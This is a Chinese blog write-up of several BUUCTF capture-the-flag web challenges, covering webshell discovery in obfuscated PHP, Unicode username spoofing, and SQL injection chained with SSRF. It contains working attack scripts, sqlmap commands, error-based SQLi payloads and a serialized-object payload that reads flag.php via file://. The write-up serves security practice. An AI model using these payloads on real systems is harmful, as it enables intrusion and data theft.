<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o133rj6ij30p303z0sz.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o133rj6ij30p303z0sz.jpg" class="lazyload"></a></p>
<hr>
<h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>打开题目，说文件源码泄露</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o133vcqrj30yn05cq3o.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o133vcqrj30yn05cq3o.jpg" class="lazyload"></a></p>
<p>下载<code>www.tar.gz</code>， 查看发现全是些混淆的乱码，但还是可以看出规律<br>可以通过GET，POST，exec，eval，assert传参回显</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o1340o6gj30kk0fn0w3.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o1340o6gj30kk0fn0w3.jpg" class="lazyload"></a></p>
<p>结合wp的脚本批量扫描一下文件里的<code>$_GET</code>和<code>$_POST</code>，然后统一赋值echo “got it”，如果回显结果中包含got it，那么证明该文件为可用shell</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">// 大佬的这个我没跑出来</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;D:/phpStudy/PHPTutorial/WWW/src/&quot;</span></span><br><span class="line">files = os.listdir(path)</span><br><span class="line">url = <span class="string">&quot;http://localhost/src/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract</span>(<span class="params">f</span>):</span><br><span class="line">    gets = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path+f, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">        lines = [i.strip() <span class="keyword">for</span> i <span class="keyword">in</span> lines]</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            <span class="keyword">if</span> line.find(<span class="string">&quot;$_GET[&#x27;&quot;</span>) &gt; <span class="number">0</span>:</span><br><span class="line">                start_pos = line.find(<span class="string">&quot;$_GET[&#x27;&quot;</span>) + <span class="built_in">len</span>(<span class="string">&quot;$_GET[&#x27;&quot;</span>)</span><br><span class="line">                end_pos = line.find(<span class="string">&quot;&#x27;&quot;</span>, start_pos)</span><br><span class="line">                gets.append(line[start_pos:end_pos])</span><br><span class="line">    <span class="keyword">return</span> gets</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">start, end</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, end):</span><br><span class="line">        filename = files[i]</span><br><span class="line">        gets = extract(filename)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;try: %s&quot;</span> % filename</span><br><span class="line">        <span class="keyword">for</span> get <span class="keyword">in</span> gets:</span><br><span class="line">            new_url = <span class="string">&quot;%s%s?%s=%s&quot;</span> % (url, filename, get, <span class="string">&#x27;echo &quot;got it&quot;&#x27;</span>)</span><br><span class="line">            r = requests.get(new_url)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;got it&#x27;</span> <span class="keyword">in</span> r.content:</span><br><span class="line">                <span class="built_in">print</span> new_url</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    pool = Pool(processes=<span class="number">15</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(files), <span class="built_in">len</span>(files)/<span class="number">15</span>):</span><br><span class="line">        pool.apply_async(exp, (i, +<span class="built_in">len</span>(files)/<span class="number">15</span>,))</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>

<hr>
<p>后来找了个其他的，就是跑的慢了点</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os,re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">filenames = os.listdir(<span class="string">&#x27;D:\phpstudy\PHPTutorial\WWW\src/&#x27;</span>)</span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;\$_[GEPOST]&#123;3,4&#125;\[.*\]&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> filenames:</span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;D:\phpstudy\PHPTutorial\WWW\src/&#x27;</span>+name,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    result = <span class="built_in">list</span>(<span class="built_in">set</span>(pattern.findall(data)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ret <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            command = <span class="string">&#x27;echo &quot;got it&quot;&#x27;</span></span><br><span class="line">            flag = <span class="string">&#x27;got it&#x27;</span></span><br><span class="line">            <span class="comment"># command = &#x27;phpinfo();&#x27;</span></span><br><span class="line">            <span class="comment"># flag = &#x27;phpinfo&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;GET&#x27;</span> <span class="keyword">in</span> ret:</span><br><span class="line">                passwd = re.findall(<span class="string">r&quot;&#x27;(.*)&#x27;&quot;</span>,ret)[<span class="number">0</span>]</span><br><span class="line">                r = requests.get(url=<span class="string">&#x27;http://127.0.0.1/src/&#x27;</span> + name + <span class="string">&#x27;?&#x27;</span> + passwd + <span class="string">&#x27;=&#x27;</span>+ command)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;got it&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;backdoor file is: &#x27;</span> + name)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;GET:  &#x27;</span> + passwd)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&#x27;POST&#x27;</span> <span class="keyword">in</span> ret:</span><br><span class="line">                passwd = re.findall(<span class="string">r&quot;&#x27;(.*)&#x27;&quot;</span>,ret)[<span class="number">0</span>]</span><br><span class="line">                r = requests.post(url=<span class="string">&#x27;http://127.0.0.1/src/&#x27;</span> + name,data=&#123;passwd:command&#125;)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;got it&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;backdoor file is: &#x27;</span> + name)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;POST:  &#x27;</span> + passwd)</span><br><span class="line">        <span class="keyword">except</span> : <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o133qxxnj307e03rdfm.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o133qxxnj307e03rdfm.jpg" class="lazyload"></a></p>
<p>访问</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xk0SzyKwfzw.php?Efa5BVG= cat /flag</span><br><span class="line"></span><br><span class="line">然后得到flag</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o133x3rmj30id06igm5.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o133x3rmj30id06igm5.jpg" class="lazyload"></a></p>
<hr>
<h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>进入页面看到有login</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o133ti8zj30v208smxf.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o133ti8zj30v208smxf.jpg" class="lazyload"></a></p>
<p>在login页面尝试注入</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o133xw74j30ma0e5q39.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o133xw74j30ma0e5q39.jpg" class="lazyload"></a></p>
<p>报错发现是flask模板，同时注意一个报错 <code>UnicodeError</code><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o134d6smj30uu0jh0yh.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o134d6smj30uu0jh0yh.jpg" class="lazyload"></a></p>
<hr>
<h3 id="解法一-非预期解"><a href="#解法一-非预期解" class="headerlink" title="解法一 (非预期解)"></a>解法一 (非预期解)</h3><p>弱口令 admin&#x2F;123</p>
<h3 id="解法二-Unicode欺骗"><a href="#解法二-Unicode欺骗" class="headerlink" title="解法二 Unicode欺骗"></a>解法二 Unicode欺骗</h3><p>在<code>change password</code>页面查看源码，发现提供了题目的源码地址</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>route.py</code>发现，不管是login、register还是change页面，只要是关于<code>session[&#39;name&#39;]</code>的操作，都先用了strlower函数将name转成小写，但是python中有自带的转小写函数lower，这里重写了一个，可能有点猫腻，于是找到strlower函数的定义</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o1348v90j30w80ca0vy.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8o1348v90j30w80ca0vy.jpg" class="lazyload"></a></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8suxgew96j30s30ic0wz.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8suxgew96j30s30ic0wz.jpg" class="lazyload"></a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def strlower(username):</span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    return username</span><br></pre></td></tr></table></figure></div>

<p>这里用的<code>nodeprep.prepare</code>函数，而nodeprep是从Twisted模块导入的，在requirements.txt文件中发现<code>Twisted==10.2.0</code>，而官网最新已经到了19.7.0(2019&#x2F;9)，版本差距很大，应该会存在漏洞。</p>
<p>在网站找字符</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://unicode-table.com/en/1D2C/</span><br></pre></td></tr></table></figure></div>
<p>然后注册 ᴬdmin 密码 123456</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8suxgchitj30g40b3wei.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8suxgchitj30g40b3wei.jpg" class="lazyload"></a></p>
<p>修改密码为 888888， 登陆admin账户，得到flag</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8suxgcu5cj30qn0d7aai.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g8suxgcu5cj30qn0d7aai.jpg" class="lazyload"></a></p>
<p>大致的思路是：在注册的时候  <code>ᴬdmin</code> 经过<code>strlower()</code>，转成，<code>admin</code>，修改密码后， 转换后的<code>admin</code>， 被<code>session[&#39;name&#39;]</code> 识别成 <code>admin</code> 用户， 登陆修改密码后的admin账户，就得到flag</p>
<hr>
<h3 id="解法三-flask-session伪造"><a href="#解法三-flask-session伪造" class="headerlink" title="解法三 flask session伪造"></a>解法三 flask session伪造</h3><p>下次专门写一篇分析 还有些东西没搞懂</p>
]]></content>
      <categories>
        <category>做题笔记</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>BuuctfDay4</title>
    <url>/yakko117/2019/11/25/BuuctfDay4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="BUUCTF-Day4"><a href="#BUUCTF-Day4" class="headerlink" title="BUUCTF Day4"></a>BUUCTF Day4</h1><h2 id="网鼎杯-Fakebook"><a href="#网鼎杯-Fakebook" class="headerlink" title="网鼎杯 Fakebook"></a>网鼎杯 Fakebook</h2><p>考点 SSRF 利用</p>
<p>题目一览发现 <code>login</code> 和 <code>join</code>，登陆不了admin， 那就先注册一个<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g97piofvnij30yt088glz.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g97piofvnij30yt088glz.jpg" class="lazyload"></a></p>
<p>注册完之后，发现url上可能存在注入，尝试注入，报错的到路径</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># view.php?no=1%27</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] query error! (You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;&#x27; at line 1)</span><br><span class="line"></span><br><span class="line">Fatal error: Call to a member function fetch_assoc() on boolean in /var/www/html/db.php on line 66</span><br><span class="line"></span><br><span class="line"># view.php?no=* 当为一个不存在的no时，返回如下</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g97piogowdj312k0g13z8.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g97piogowdj312k0g13z8.jpg" class="lazyload"></a></p>
<hr>
<h3 id="扫描如下"><a href="#扫描如下" class="headerlink" title="扫描如下"></a>扫描如下</h3><p> 发现隐藏的 <code>/user.php.bak</code> 在 <code>robots.txt</code> 里<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g97piox658j30xu0guk6p.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g97piox658j30xu0guk6p.jpg" class="lazyload"></a></p>
<p>输入到地址栏，得到文件。同时扫描还发现 <code>flag.php</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># user.php.bak 源码解析如下</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="comment">/*curl_init()：初始化一个 cURL 会话并且全部的选项都被设置后被调用*/</span></span><br><span class="line"> </span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            curl_setopt — 为给定的cURL会话句柄设置一个选项。</span></span><br><span class="line"><span class="comment">            说明：</span></span><br><span class="line"><span class="comment">                bool curl_setopt ( resource $ch , int $option , mixed $value )</span></span><br><span class="line"><span class="comment">            参数:</span></span><br><span class="line"><span class="comment">                ch：由 curl_init() 返回的 cURL 句柄。</span></span><br><span class="line"><span class="comment">                option：需要设置的CURLOPT_XXX选项。</span></span><br><span class="line"><span class="comment">                value：将设置在option选项上的值。</span></span><br><span class="line"><span class="comment">                对于下面的这些option的可选参数，value应该被设置一个bool类型的值：</span></span><br><span class="line"><span class="comment">                CURLOPT_RETURNTRANSFER：将curl_exec()获取的信息以文件流的形式返回，而不是直接输出。</span></span><br><span class="line"><span class="comment">            对于下面的这些option的可选参数，value应该被设置一个string类型的值：</span></span><br><span class="line"><span class="comment">                CURLOPT_URL：需要获取的URL地址，也可以在curl_init()函数中设置。</span></span><br><span class="line"><span class="comment">                         </span></span><br><span class="line"><span class="comment">    文件流的形式:指的是在传递过程中的文件，比如你上传一张图片，那么他不是以一个完整的图片传输的，是将文件按特定编码的字符传输</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        </span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="comment">/*curl_exec ：执行 cURL 会话*/</span></span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            curl_getinfo — 获取一个cURL连接资源句柄的信息</span></span><br><span class="line"><span class="comment">                说明：</span></span><br><span class="line"><span class="comment">                       mixed curl_getinfo ( resource $ch [, int $opt = 0 ] )获取最后一次传输的相关信息。</span></span><br><span class="line"><span class="comment">                参数：</span></span><br><span class="line"><span class="comment">                      ch 由 curl_init() 返回的 cURL 句柄。</span></span><br><span class="line"><span class="comment">                      opt：这个参数可能是以下常量之一:</span></span><br><span class="line"><span class="comment">                            CURLINFO_HTTP_CODE : 最后一个收到的HTTP代码</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">         </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.jpg)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<h3 id="尝试注入"><a href="#尝试注入" class="headerlink" title="尝试注入"></a>尝试注入</h3><p>在join页面拦截POST数据包，保存为 <code>POST.txt</code> ， 然后用sqlmap跑</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">http</div></div><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/join.ok.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>c44d7803-daf6-41ff-8d40-9650e8c03b74.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>54</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://c44d7803-daf6-41ff-8d40-9650e8c03b74.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://c44d7803-daf6-41ff-8d40-9650e8c03b74.node3.buuoj.cn/join.php</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=ld71hiq3mijrvi6n4rckvnpli5</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-dts"><span class="attr">username</span><span class="operator">=</span>admin1<span class="variable">&amp;passwd</span>=admin<span class="variable">&amp;age</span>=<span class="number">18</span><span class="variable">&amp;blog</span>=www.hello.com</span></span><br><span class="line"><span class="language-dts"></span></span><br><span class="line"><span class="language-dts"></span></span><br><span class="line"><span class="language-dts"><span class="meta"># sqlmap -r /root/下载/post.txt --dump -tables</span></span></span><br></pre></td></tr></table></figure></div>
<p>发现data是序列化保存的，猜测后台是通过反序列化data后输出前端结果</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g97pip5rorj30st0i9h0r.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g97pip5rorj30st0i9h0r.jpg" class="lazyload"></a></p>
<hr>
<h3 id="Fuzz测试"><a href="#Fuzz测试" class="headerlink" title="Fuzz测试"></a>Fuzz测试</h3><h4 id="Order-by"><a href="#Order-by" class="headerlink" title="Order by"></a>Order by</h4><p>这里存在对空格的过滤 </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/view.php?no=1++order++by+4--+</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g97pioj1dwj30zl0e3mzo.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g97pioj1dwj30zl0e3mzo.jpg" class="lazyload"></a></p>
<p>同时原来的sqlmap 已经跑出了表名列名<br>当然看大佬的wp，自己手注也行</p>
<h4 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">view.php?no=1+and+updatexml(1,make_set(3,&#x27;~&#x27;,(select group_concat(table_name)+from+information_schema.tables+where+table_schema=database())),1)#</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g97pioi9z4j30sb041aaa.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g97pioi9z4j30sb041aaa.jpg" class="lazyload"></a></p>
<h4 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/view.php?no=1+and+updatexml(1,make_set(3,&#x27;~&#x27;,(select+group_concat(column_name)+from information_schema.columns+where+table_name=&quot;users&quot;)),1)#</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g97pioid7aj30rv0433yt.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g97pioid7aj30rv0433yt.jpg" class="lazyload"></a></p>
<p>利用no参数进行注入，在反序列化中构造file文件协议，利用服务端请求伪造漏洞访问服务器上的flag.php文件。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/view.php?no=0/**/union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure></div>

